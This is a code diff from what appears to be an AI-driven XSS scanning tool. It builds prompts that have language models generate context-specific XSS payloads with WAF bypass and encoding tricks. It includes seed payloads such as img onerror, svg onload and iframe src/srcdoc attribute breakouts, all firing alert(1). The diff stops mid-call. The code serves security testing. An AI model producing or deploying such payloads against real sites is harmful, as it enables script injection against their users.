+    # Final fallback: static BASE_PAYLOADS (older path, still useful if pool
+    # fails to load for any reason)
+    seeds = _match_payloads_to_context(list(BASE_PAYLOADS), context_type, surviving_chars)
+    return [
+        {
+            "payload": payload.payload,
+            "bypass_family": payload.bypass_family or infer_bypass_family(payload.payload, payload.tags),
+            "tags": payload.tags[:4],
+        }
+        for payload in seeds
+    ]
+
+
+def _seed_examples_section(
+    *,
+    context_type: str,
+    surviving_chars: str,
+    reference_payloads: list[Any] | None,
+    waf: str | None = None,
+) -> str:
+    examples = _seed_examples_for_context(
+        context_type=context_type,
+        surviving_chars=surviving_chars,
+        reference_payloads=reference_payloads,
+        waf=waf,
+    )
+    if not examples:
+        return ""
+    return "SEED PAYLOADS (mutate, do not copy):\n" + json.dumps(examples, indent=2) + "\n"
+
+
+def _generation_output_schema(phase: str) -> dict[str, Any]:
+    if phase == "scout":
+        return {
+            "type": "object",
+            "properties": {
+                "payloads": {
+                    "type": "array",
+                    "items": {
+                        "type": "object",
+                        "properties": {
+                            "payload": {"type": "string"},
+                            "title": {"type": "string"},
+                            "test_vector": {"type": "string"},
+                            "bypass_family": {"type": "string"},
+                        },
+                        "required": ["payload", "title", "test_vector", "bypass_family"],
+                        "additionalProperties": False,
+                    },
+                },
+            },
+            "required": ["payloads"],
+            "additionalProperties": False,
+        }
+    if phase == "contextual":
+        return {
+            "type": "object",
+            "properties": {
+                "payloads": {
+                    "type": "array",
+                    "items": {
+                        "type": "object",
+                        "properties": {
+                            "payload": {"type": "string"},
+                            "title": {"type": "string"},
+                            "explanation": {"type": "string"},
+                            "test_vector": {"type": "string"},
+                            "tags": {
+                                "type": "array",
+                                "items": {"type": "string"},
+                            },
+                            "target_sink": {"type": "string"},
+                            "bypass_family": {"type": "string"},
+                            "risk_score": {"type": "integer"},
+                        },
+                        "required": [
+                            "payload",
+                            "title",
+                            "explanation",
+                            "test_vector",
+                            "tags",
+                            "target_sink",
+                            "bypass_family",
+                            "risk_score",
+                        ],
+                        "additionalProperties": False,
+                    },
+                },
+            },
+            "required": ["payloads"],
+            "additionalProperties": False,
+        }
+    return None
+
+
+def _prompt_for_generation_phase(
+    context: ParsedContext,
+    phase: str,
+    reference_payloads: list[Any] | None = None,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+) -> str:
+    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
+    if phase == "research":
+        return _cloud_prompt_for_context(
+            context,
+            reference_payloads=reference_payloads,
+            waf=waf,
+            past_findings=past_findings,
+            past_lessons=past_lessons,
+            strategy_hint=strategy_hint,
+        )
+    dom_runtime = _extract_dom_runtime_context(context)
+    if dom_runtime:
+        return _compact_dom_prompt_for_cloud(
+            context,
+            waf=waf,
+            past_findings=past_findings,
+            past_lessons=past_lessons,
+            strategy_hint=strategy_hint,
+            reference_payloads=reference_payloads,
+        )
+
+    sink_type, context_type, surviving_chars = _extract_probe_context(context)
+    scout_context_envelope_section = _context_envelope_section(context, waf=waf, compact=True)
+    context_envelope_section = _context_envelope_section(context, waf=waf)
+    planning_envelope_section = _planning_envelope_section(
+        context,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
+    success_envelope_section = _success_envelope_section(past_lessons)
+    failure_envelope_section = _failure_envelope_section(past_lessons)
+    auth_section = ""
+    if context.auth_notes:
+        auth_section = (
+            "SESSION CONTEXT:\n"
+            + "\n".join(f"  - {note}" for note in context.auth_notes[:3])
+            + "\n"
+        )
+    probe_lines = [
+        f"Primary sink type: {sink_type or 'unknown'}",
+        f"Reflection context: {context_type or 'unknown'}",
+        f"Confirmed surviving special characters: {surviving_chars or '(none observed)'}",
+    ]
+    # href bypass: injection is in HTML body — must inject a full tag, not a bare URI
+    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
+        probe_lines.append(
+            "INJECTION SHAPE: Parameter is in HTML BODY — inject a FULL TAG like "
+            '<a href="javascript:alert(1)">x</a> or '
+            '<button formaction="javascript:alert(1)">x</button>. '
+            "Event handlers (onerror/ontoggle/onload) are stripped. "
+            "Bare javascript: URIs render as plain text — always wrap in a tag."
+        )
+    seed_section = _seed_examples_section(
+        context_type=context_type,
+        surviving_chars=surviving_chars,
+        reference_payloads=reference_payloads,
+        waf=waf,
+    )
+    if phase == "scout":
+        obfuscation_section = _obfuscation_techniques_section(context_type)
+        return (
+            "You are an authorized XSS assessor. Generate payloads only — no analysis.\n"
+            "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
+            + "\n".join(probe_lines)
+            + "\n"
+            + obfuscation_section
+            + "Task: produce 5-8 payloads that apply the techniques above to this exact context.\n"
+            "Use seeds as few-shot grounding — mutate and combine techniques, do not copy seeds verbatim.\n"
+            "Each payload must include: payload, title, test_vector, bypass_family.\n"
+            + scout_context_envelope_section
+            + seed_section
+        ).strip()
+
+    findings_section = _similar_findings_section(
+        past_findings,
+        context_type=context_type,
+        limit=3,
+    )
+    app_signals_section = _application_signals_section(
+        context_type=context_type,
+        surviving_chars=surviving_chars,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+        context=context,
+    )
+    return (
+        "You are an authorized XSS assessor. The fast scan did not confirm execution.\n"
+        "Reason about what this specific application blocks and allows. Generate payloads only — no analysis.\n"
+        "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
+        + app_signals_section
+        + success_envelope_section
+        + failure_envelope_section
+        + findings_section
+        + seed_section
+        + auth_section
+        + "Task: produce 6-8 payloads that work around what this application blocks.\n"
+        "Use the application signals above to reason about what survives sanitization.\n"
+        "Prefer materially distinct techniques. Target this application specifically.\n"
+        "Each payload must include: payload, title, explanation, test_vector, tags, target_sink, bypass_family, risk_score.\n"
+    ).strip()
+
+
+def _compact_reflected_research_prompt(
     context: ParsedContext,
     reference_payloads: list[Any] | None = None,
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
 ) -> str:
-    """Build the LLM prompt.
-
-    Structure (ordered by importance for small-model attention):
-      1. Probe results (surviving chars, confirmed sink) — actionable, upfront
-      2. Past findings for this context (few-shot bypass examples)
-      3. WAF context (if any)
-      4. Reference public payloads (if any)
-      5. Full parsed context JSON
-      6. Output schema + requirements
-    """
-    sink_type, ctx_type, surviving_chars = _extract_probe_context(context)
-
-    # ── Section 1: Active probe summary ──────────────────────────────────────
-    probe_section = ""
-    if sink_type or surviving_chars:
-        blocked_note = (
-            f"Only characters in {surviving_chars!r} survived — ALL others are filtered. "
-            "Payloads MUST be constructable from the surviving set."
-            if surviving_chars
-            else "No char survival data — assume conservative filter."
-        )
-        surviving_display = repr(surviving_chars) if surviving_chars else "unknown"
-        probe_section = (
-            "ACTIVE PROBE RESULTS (highest priority — payloads must fit these constraints):\n"
-            f"  confirmed_sink: {sink_type or 'unknown'}\n"
-            f"  reflection_context: {ctx_type or 'unknown'}\n"
-            f"  surviving_chars: {surviving_display}\n"
-            f"  {blocked_note}\n"
-        )
-
-    # ── Section 2: Past findings (few-shot examples) ─────────────────────────
-    findings_section = ""
-    if past_findings:
-        findings_section = findings_prompt_section(past_findings) + "\n"
-
-    lessons_section = ""
-    if past_lessons:
-        lessons_section = lessons_prompt_section(past_lessons) + "\n"
-
-    # ── Section 2b: Auth context ──────────────────────────────────────────────
+    sink_type, context_type, surviving_chars = _extract_probe_context(context)
+    context_envelope_section = _context_envelope_section(context, waf=waf)
+    planning_envelope_section = _planning_envelope_section(
+        context,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
+    success_envelope_section = _success_envelope_section(past_lessons)
+    failure_envelope_section = _failure_envelope_section(past_lessons)
+    findings_section = _similar_findings_section(
+        past_findings,
+        context_type=context_type,
+        limit=5,
+    )
+    seed_section = _seed_examples_section(
+        context_type=context_type,
+        surviving_chars=surviving_chars,
+        reference_payloads=reference_payloads,
+        waf=waf,
+    )
     auth_section = ""
     if context.auth_notes:
         auth_section = (
-            "SESSION CONTEXT (authenticated scan — all requests carry credentials):\n"
-            + "\n".join(f"  - {note}" for note in context.auth_notes)
+            "SESSION CONTEXT:\n"
+            + "\n".join(f"  - {note}" for note in context.auth_notes[:3])
             + "\n"
-            "Consider payloads that leverage privileged state: authenticated endpoints, "
-            "stored/persistent XSS in user-controlled fields, CSRF-chained vectors.\n"
         )
 
-    # ── Section 3: WAF ───────────────────────────────────────────────────────
-    waf_section = ""
-    if waf:
-        waf_section = (
-            f"WAF: {waf.title()} — prioritise bypass techniques for this WAF "
-            f"(encoding variants, alternative event handlers, namespace tricks, "
-            f"case mixing, whitespace tricks).\n"
-        )
+    probe_lines = [
+        f"Target URL: {context.source}",
+        f"Primary sink type: {sink_type or 'unknown'}",
+        f"Reflection context: {context_type or 'unknown'}",
+        f"Confirmed surviving special characters: {surviving_chars or '(none observed)'}",
+    ]
 
-    # ── Section 4: Reference public payloads ─────────────────────────────────
-    reference_section = ""
-    if reference_payloads:
-        ref_items = [
+    return (
+        "You are generating payloads for an authorized XSS assessment.\n"
+        "Return ONLY a JSON object.\n\n"
+        "Output schema:\n"
+        "{\n"
+        "  \"payloads\": [\n"
+        "    {\n"
+        "      \"payload\": \"string\",\n"
+        "      \"title\": \"short name\",\n"
+        "      \"explanation\": \"why it fits this exact context\",\n"
+        "      \"test_vector\": \"exact delivery string\",\n"
+        "      \"tags\": [\"tag1\", \"tag2\"],\n"
+        "      \"target_sink\": \"sink name or empty\",\n"
+        f"{_STRATEGY_SCHEMA_BLOCK}\n"
+        "      \"bypass_family\": \"best-fit family\",\n"
+        "      \"risk_score\": 1-100\n"
+        "    }\n"
+        "  ]\n"
+        "}\n\n"
+        + "\n".join(probe_lines)
+        + "\n"
+        "Only special-character survival is measured; do not assume letters or digits are blocked.\n"
+        "Task: produce 8-12 payloads for this exact context.\n"
+        "Few-shot examples matter more than restating constraints: mutate successful and similar payloads instead of copying them.\n"
+        "If needed, use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding only when they materially help this context.\n"
+        "Prefer materially distinct techniques and keep the output execution-focused.\n"
+        + context_envelope_section
+        + planning_envelope_section
+        + seed_section
+        + success_envelope_section
+        + failure_envelope_section
+        + findings_section
+        + auth_section
+    ).strip()
+
+
+def _dom_sink_request_profile(sink: str) -> tuple[str, list[str]]:
+    normalized = sink.strip().lower()
+    if normalized in {"innerhtml", "outerhtml", "insertadjacenthtml"}:
+        return (
+            "html_injection",
+            [
+                "Focus on direct HTML element injection that auto-executes without user interaction.",
+                "Prefer compact event-handler payloads such as image, svg, details, or similar DOM-native HTML vectors.",
+                "Do not spend tokens on JavaScript string breakout ideas unless the sink explicitly indicates script evaluation.",
+            ],
+        )
+    if normalized in {"eval", "function", "settimeout", "setinterval"}:
+        return (
+            "js_execution",
+            [
+                "Focus on JavaScript expressions or statements that execute immediately in code-evaluation sinks.",
+                "Prefer short expression payloads over HTML tags.",
+                "Do not propose HTML-only payloads unless they are wrapped in code that the sink will execute.",
+            ],
+        )
+    if normalized in {"document.write", "document.writeln"}:
+        return (
+            "document_write",
+            [
+                "Focus on HTML or attribute breakout payloads suitable for markup assembled by document.write.",
+                "Prioritize quote closure, URL-attribute breakout, and same-tag event-handler injection when angle brackets may be constrained.",
+                "Include both full-tag injection payloads and no-angle-bracket attribute pivots if they are plausible.",
+            ],
+        )
+    return (
+        "generic_dom",
+        [
+            "Focus on payloads tailored to the exact DOM sink that already received tainted input.",
+            "Prefer compact, auto-executing payloads over generic broad XSS lists.",
+        ],
+    )
+
+
+def _compact_dom_prompt_for_local(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+    reference_payloads: list[Any] | None = None,
+) -> str:
+    """Build a compact sink-specific DOM prompt for smaller local models."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+    profile_name, profile_rules = _dom_sink_request_profile(sink)
+    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
+
+    findings_section = ""
+    if past_findings:
+        slim = [
             {
-                "payload": p.payload if hasattr(p, "payload") else p.get("payload", ""),
-                "tags": p.tags if hasattr(p, "tags") else p.get("tags", []),
+                "payload": finding.payload,
+                "sink_type": finding.sink_type,
+                "context_type": finding.context_type,
+                "bypass_family": finding.bypass_family,
             }
-            for p in reference_payloads[:15]
+            for finding in past_findings[:2]
         ]
-        reference_section = (
-            "Community reference payloads (technique inspiration only — adapt, don't copy):\n"
-            + json.dumps(ref_items, indent=2)
-            + "\n"
-        )
+        findings_section = "Related findings:\n" + json.dumps(slim, indent=2) + "\n"
 
-    # ── Section 5: Context JSON ───────────────────────────────────────────────
-    context_blob = json.dumps(context.to_dict(), indent=2)
+    lessons_section = ""
+    if past_lessons:
+        lesson_lines = []
+        for lesson in past_lessons[:2]:
+            title = getattr(lesson, "title", "")
+            summary = getattr(lesson, "summary", "")
+            if title or summary:
+                lesson_lines.append(f"- {title}: {summary}".strip(": "))
+        if lesson_lines:
+            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
+    context_envelope_section = _context_envelope_section(context, waf=waf)
+    planning_envelope_section = _planning_envelope_section(
+        context,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
+    success_envelope_section = _success_envelope_section(past_lessons)
+    failure_envelope_section = _failure_envelope_section(past_lessons)
+    seed_section = _seed_examples_section(
+        context_type="dom_xss",
+        surviving_chars="",
+        reference_payloads=reference_payloads,
+        waf=waf,
+    )
 
-    # ── Bypass family hint ────────────────────────────────────────────────────
-    family_list = ", ".join(BYPASS_FAMILIES)
+    context_summary = {
+        "source": context.source,
+        "frameworks": context.frameworks[:3],
+        "auth": bool(context.auth_notes),
+        "dom_runtime": dom_runtime,
+        "dom_sinks": [
+            {
+                "sink": sink_item.sink,
+                "location": sink_item.location,
+            }
+            for sink_item in context.dom_sinks[:3]
+        ],
+    }
 
-    return f"""You are generating offensive-security test payloads for an authorized XSS assessment.
-Return ONLY a JSON object — no markdown, no explanation outside the JSON.
+    waf_line = f"WAF: {waf}\n" if waf else ""
+    rule_lines = "\n".join(f"- {rule}" for rule in profile_rules)
+
+    return f"""You are generating authorized DOM XSS test payloads for a small local model pass.
+Return ONLY compact JSON.
+
+Output schema:
+{{
+  "payloads": [
+    {{
+      "payload": "string",
+      "target_sink": "{sink or 'unknown'}",
+      "tags": ["short", "labels"],
+      "strategy": {{
+        "attack_family": "short family label",
+        "delivery_mode_hint": "query | fragment | post | same_page",
+        "encoding_hint": "raw | html_entity | url_encoded | mixed",
+        "session_hint": "same_page | navigate_then_fire | post_then_sink",
+        "follow_up_hint": "next tactic if this class misses",
+        "coordination_hint": "single_param | multi_param | fragment_only | same_tag_pivot"
+      }}
+    }}
+  ]
+}}
+
+Requirements:
+- Produce 3-6 payloads only.
+- Solve the exact DOM source->sink path shown below.
+- Prefer fast, practical payloads over exhaustive coverage.
+- Avoid explanations, rankings, essays, or long reasoning.
+- Keep each `strategy` object short and actionable.
+- If the effective constraints suggest it, you may use uncommon encodings such as numeric entities or Unicode-width variants, but only when they plausibly survive and change interpretation.
+- Sink profile: {profile_name}
+{rule_lines}
+
+DOM runtime:
+{json.dumps(dom_runtime, indent=2)}
+{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{lessons_section}{findings_section}{seed_section}Context summary:
+{json.dumps(context_summary, indent=2)}""".strip()
+
+
+def _dom_seed_examples(profile_name: str) -> list[dict[str, Any]]:
+    if profile_name == "html_injection":
+        return [
+            {
+                "payload": "<img src=x onerror=alert(1)>",
+                "title": "img onerror",
+                "test_vector": "?param=<img src=x onerror=alert(1)>",
+                "tags": ["html", "event-handler", "autofire"],
+                "target_sink": "innerHTML",
+                "bypass_family": "event-handler-injection",
+                "risk_score": 88,
+            },
+            {
+                "payload": "<svg onload=alert(1)>",
+                "title": "svg onload",
+                "test_vector": "?param=<svg onload=alert(1)>",
+                "tags": ["svg", "autofire"],
+                "target_sink": "innerHTML",
+                "bypass_family": "svg-namespace",
+                "risk_score": 84,
+            },
+        ]
+    if profile_name == "js_execution":
+        return [
+            {
+                "payload": "alert(1)",
+                "title": "direct alert",
+                "test_vector": "#alert(1)",
+                "tags": ["javascript", "expression"],
+                "target_sink": "eval",
+                "bypass_family": "js-string-breakout",
+                "risk_score": 82,
+            },
+            {
+                "payload": "confirm(1)",
+                "title": "direct confirm",
+                "test_vector": "#confirm(1)",
+                "tags": ["javascript", "expression"],
+                "target_sink": "eval",
+                "bypass_family": "js-string-breakout",
+                "risk_score": 78,
+            },
+        ]
+    return []
+
+
+def _document_write_subcontext(context: ParsedContext) -> dict[str, Any]:
+    """Infer a narrower HTML subcontext for document.write sinks when possible."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    source_type = dom_runtime.get("source_type", "")
+    source_name = dom_runtime.get("source_name", "")
+
+    for script in context.inline_scripts:
+        compact = " ".join(script.split())
+        lower = compact.lower()
+        if "document.write" not in lower:
+            continue
+
+        hint: dict[str, Any] = {
+            "script_excerpt": compact[:240],
+            "source_type": source_type,
+            "source_name": source_name,
+        }
+
+        if "<iframe" in lower and "src='" in lower:
+            hint.update(
+                {
+                    "html_subcontext": "single_quoted_html_attr",
+                    "tag": "iframe",
+                    "attribute": "src",
+                    "quote_style": "single",
+                    "payload_shape": "same_tag_attribute_breakout",
+                    "attacker_prefix": "<iframe src='",
+                }
+            )
+            if "' width='" in compact:
+                suffix = compact.split("' width='", 1)[1]
+                hint["attacker_suffix"] = "' width='" + suffix[:80]
+            hint["recommended_families"] = [
+                "same-tag event handler injection",
+                "srcdoc pivot",
+                "quote closure without angle brackets",
+                "full tag escape only if angle brackets are likely to survive",
+            ]
+            if source_type == "fragment":
+                hint["source_behavior"] = (
+                    "Fragment payloads often arrive URL-encoded inside the iframe src string. "
+                    "Prefer quote closure and same-tag attribute injection before relying on raw < >."
+                )
+            elif source_type == "query_param":
+                hint["source_behavior"] = (
+                    "The full query string is concatenated into the iframe src URL. "
+                    "Prefer breaking out of the single-quoted src attribute before attempting full-tag injection."
+                )
+            return hint
+
+    return {
+        "html_subcontext": "unknown_document_write_markup",
+        "source_type": source_type,
+        "source_name": source_name,
+        "recommended_families": [
+            "same-tag attribute injection",
+            "quote closure",
+            "srcdoc pivot",
+            "full tag escape",
+        ],
+    }
+
+
+def _compact_dom_prompt_for_cloud(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+    reference_payloads: list[Any] | None = None,
+) -> str:
+    """Build a compact seeded DOM cloud prompt for simpler sink families."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+    profile_name, profile_rules = _dom_sink_request_profile(sink)
+    merged_reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
+    seed_examples = _reference_payload_examples(merged_reference_payloads, limit=5)
+    if not seed_examples:
+        seed_examples = _dom_seed_examples(profile_name)
+    behavior_section = _behavior_profile_section(context)
+    findings_section = _similar_findings_section(
+        past_findings,
+        context_type="dom_xss",
+        limit=5,
+    )
+
+    lessons_section = ""
+    if past_lessons:
+        lesson_lines = []
+        for lesson in past_lessons[:3]:
+            title = getattr(lesson, "title", "")
+            summary = getattr(lesson, "summary", "")
+            if title or summary:
+                lesson_lines.append(f"- {title}: {summary}".strip(": "))
+        if lesson_lines:
+            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
+    context_envelope_section = _context_envelope_section(context, waf=waf)
+    planning_envelope_section = _planning_envelope_section(
+        context,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
+    success_envelope_section = _success_envelope_section(past_lessons)
+    failure_envelope_section = _failure_envelope_section(past_lessons)
+
+    context_summary = {
+        "source": context.source,
+        "frameworks": context.frameworks[:3],
+        "auth": bool(context.auth_notes),
+        "dom_runtime": dom_runtime,
+        "dom_sinks": [
+            {
+                "sink": sink_item.sink,
+                "location": sink_item.location,
+            }
+            for sink_item in context.dom_sinks[:3]
+        ],
+    }
+
+    waf_line = f"WAF: {waf}\n" if waf else ""
+    rule_lines = "\n".join(f"- {rule}" for rule in profile_rules)
+    seed_section = ""
+    if seed_examples:
+        seed_section = "Seed technique examples:\n" + json.dumps(seed_examples, indent=2) + "\n"
+
+    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
+Return ONLY a JSON object.
 
 Output schema:
 {{
@@ -181,25 +1483,197 @@ Output schema:
     {{
       "payload": "string",
       "title": "short name",
-      "explanation": "why it fits this specific context",
-      "test_vector": "exact delivery (e.g. ?param=...)",
+      "explanation": "why it fits this exact DOM context",
+      "test_vector": "exact delivery string",
       "tags": ["tag1", "tag2"],
-      "target_sink": "sink name or empty",
-      "bypass_family": "one of: {family_list}",
+      "target_sink": "{sink or 'unknown'}",
+{_STRATEGY_SCHEMA_BLOCK}
+      "bypass_family": "best-fit family",
       "risk_score": 1-100
     }}
   ]
 }}
 
 Requirements:
-- Produce 15-25 payloads.
-- Payloads MUST be tailored to the detected sinks, surviving chars, and context above.
-- Generic payloads that ignore the probe results score low — be specific.
-- Include payloads from multiple bypass families that are plausible for this context.
-- Prefer compact, self-contained payloads with no external dependencies.
+- Produce 4-8 payloads only.
+- Solve the exact DOM source->sink path shown below.
+- Do not return an empty payload list.
+- Prefer materially distinct payload families over near-duplicates.
+- Keep payloads compact and execution-focused.
+- Use `strategy` to describe delivery shape and the next tactic to pivot to if the sink stays taint-only.
+- If the effective constraints justify it, you may use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding, but only when they plausibly change parser or WAF interpretation.
+- Sink profile: {profile_name}
+{rule_lines}
 
-{probe_section}{lessons_section}{findings_section}{auth_section}{waf_section}{reference_section}Full parsed context:
-{context_blob}""".strip()
+DOM runtime:
+{json.dumps(dom_runtime, indent=2)}
+{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{behavior_section}{lessons_section}{findings_section}{seed_section}Context summary:
+{json.dumps(context_summary, indent=2)}""".strip()
+
+
+def _document_write_prompt_for_cloud(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+    reference_payloads: list[Any] | None = None,
+) -> str:
+    """Build a focused rich prompt for document.write DOM sinks."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    subcontext = _document_write_subcontext(context)
+    behavior_section = _behavior_profile_section(context)
+
+    lessons_section = ""
+    if past_lessons:
+        lesson_lines = []
+        for lesson in past_lessons[:4]:
+            title = getattr(lesson, "title", "")
+            summary = getattr(lesson, "summary", "")
+            if title or summary:
+                lesson_lines.append(f"- {title}: {summary}".strip(": "))
+        if lesson_lines:
+            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
+    context_envelope_section = _context_envelope_section(context, waf=waf)
+    planning_envelope_section = _planning_envelope_section(
+        context,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
+    success_envelope_section = _success_envelope_section(past_lessons)
+    failure_envelope_section = _failure_envelope_section(past_lessons)
+    findings_section = _similar_findings_section(
+        past_findings,
+        context_type="dom_xss",
+        limit=5,
+    )
+    seed_examples = _reference_payload_examples(
+        _merged_reference_payloads(reference_payloads, past_lessons),
+        limit=5,
+    )
+    seed_section = ""
+    if seed_examples:
+        seed_section = "Seed technique examples:\n" + json.dumps(seed_examples, indent=2) + "\n"
+
+    targeted_examples = [
+        {
+            "payload": "'onload='alert(1)",
+            "title": "same-tag onload pivot",
+            "why": "Closes a single-quoted iframe src attribute and injects an event handler without needing angle brackets.",
+        },
+        {
+            "payload": "'srcdoc='&#x3C;svg/onload=alert(1)&#x3E;'>",
+            "title": "srcdoc pivot",
+            "why": "Breaks out of the iframe src attribute and swaps execution into srcdoc using encoded markup.",
+        },
+        {
+            "payload": "'><svg onload=alert(1)>",
+            "title": "full tag escape",
+            "why": "Useful only if angle brackets survive to the document.write sink.",
+        },
+    ]
+
+    context_summary = {
+        "source": context.source,
+        "frameworks": context.frameworks[:3],
+        "auth": bool(context.auth_notes),
+        "dom_runtime": dom_runtime,
+        "document_write_subcontext": subcontext,
+        "inline_scripts": context.inline_scripts[:2],
+    }
+
+    waf_line = f"WAF: {waf}\n" if waf else ""
+    recommended = "\n".join(
+        f"- {item}" for item in subcontext.get("recommended_families", [])
+    )
+
+    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
+Return ONLY a JSON object.
+
+Output schema:
+{{
+  "payloads": [
+    {{
+      "payload": "string",
+      "title": "short name",
+      "explanation": "why it fits this exact document.write subcontext",
+      "test_vector": "exact delivery string",
+      "tags": ["tag1", "tag2"],
+      "target_sink": "document.write",
+{_STRATEGY_SCHEMA_BLOCK}
+      "bypass_family": "best-fit family",
+      "risk_score": 1-100
+    }}
+  ]
+}}
+
+Requirements:
+- Produce 6-10 payloads only.
+- Do not return an empty payload list.
+- Solve the exact source->sink path below, not generic XSS.
+- Bias toward payloads that execute inside the existing tag first.
+- Include at least:
+  - 3 same-tag attribute pivots that do not require raw < >
+  - 2 srcdoc or URL-attribute pivots if plausible
+  - 1 full tag breakout only if angle brackets might survive
+- Avoid safe parser probes and other non-executing markup.
+- Prefer materially distinct payload families over near-duplicates.
+- Use `strategy` to explain which attack family the payload belongs to and what family should be tried next if it does not execute.
+- If the effective constraints justify it, you may use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding, but only when they plausibly improve this exact document.write subcontext.
+
+DOM runtime:
+{json.dumps(dom_runtime, indent=2)}
+Document.write subcontext:
+{json.dumps(subcontext, indent=2)}
+Recommended payload families:
+{recommended}
+{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{behavior_section}{lessons_section}{findings_section}{seed_section}Targeted examples:
+{json.dumps(targeted_examples, indent=2)}
+Context summary:
+{json.dumps(context_summary, indent=2)}""".strip()
+
+
+def _cloud_prompt_for_context(
+    context: ParsedContext,
+    reference_payloads: list[Any] | None = None,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+) -> str:
+    """Choose a cloud prompt shape based on the DOM sink profile."""
+    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
+    dom_runtime = _extract_dom_runtime_context(context)
+    if dom_runtime:
+        sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+        profile_name, _ = _dom_sink_request_profile(sink)
+        if profile_name == "document_write":
+            return _document_write_prompt_for_cloud(
+                context,
+                waf=waf,
+                past_findings=past_findings,
+                past_lessons=past_lessons,
+                strategy_hint=strategy_hint,
+                reference_payloads=reference_payloads,
+            )
+        if profile_name != "document_write":
+            return _compact_dom_prompt_for_cloud(
+                context,
+                waf=waf,
+                past_findings=past_findings,
+                past_lessons=past_lessons,
+                strategy_hint=strategy_hint,
+                reference_payloads=reference_payloads,
+            )
+    return _compact_reflected_research_prompt(
+        context,
+        reference_payloads=reference_payloads,
+        waf=waf,
+        past_findings=past_findings,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -350,23 +1824,44 @@ def _extract_json_blob(text: str) -> dict[str, Any]:
     return json.loads(text[start: end + 1])
 
 
+def _normalize_strategy(item: dict[str, Any]) -> StrategyProfile | None:
+    raw = item.get("strategy")
+    if not isinstance(raw, dict):
+        return None
+    strategy = StrategyProfile(
+        attack_family=str(raw.get("attack_family", "")).strip(),
+        delivery_mode_hint=str(raw.get("delivery_mode_hint", "")).strip(),
+        encoding_hint=str(raw.get("encoding_hint", "")).strip(),
+        session_hint=str(raw.get("session_hint", "")).strip(),
+        follow_up_hint=str(raw.get("follow_up_hint", "")).strip(),
+        coordination_hint=str(raw.get("coordination_hint", "")).strip(),
+    )
+    if not any(strategy.to_dict().values()):
+        return None
+    return strategy
+
+
 def _normalize_payloads(items: list[dict[str, Any]], source: str) -> list[PayloadCandidate]:
     normalized: list[PayloadCandidate] = []
     for item in items:
         payload = str(item.get("payload", "")).strip()
         if not payload:
             continue
+        tags = [str(tag) for tag in item.get("tags", []) if str(tag).strip()]
+        bypass_family = str(item.get("bypass_family", "")).strip() or infer_bypass_family(payload, tags)
         normalized.append(
             PayloadCandidate(
                 payload=payload,
                 title=str(item.get("title", "AI-generated payload")).strip() or "AI-generated payload",
                 explanation=str(item.get("explanation", "Tailored by model output.")).strip(),
                 test_vector=str(item.get("test_vector", "Inject into the highest-confidence sink.")).strip(),
-                tags=[str(tag) for tag in item.get("tags", []) if str(tag).strip()],
+                tags=tags,
                 target_sink=str(item.get("target_sink", "")).strip(),
                 framework_hint=str(item.get("framework_hint", "")).strip(),
+                bypass_family=bypass_family,
                 risk_score=int(item.get("risk_score", 0) or 0),
                 source=source,
+                strategy=_normalize_strategy(item),
             )
         )
     return normalized
@@ -383,12 +1878,14 @@ def _generate_with_ollama(
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
+    request_timeout_seconds: int = 120,
 ) -> tuple[list[PayloadCandidate], str]:
     ready, resolved_model, reason = _ensure_ollama_model(model)
     if not ready:
         raise RuntimeError(f"Ollama unavailable: {reason}")
-    prompt = _prompt_for_context(
+    prompt = _prompt_for_generation_phase(
         context,
+        phase="scout",
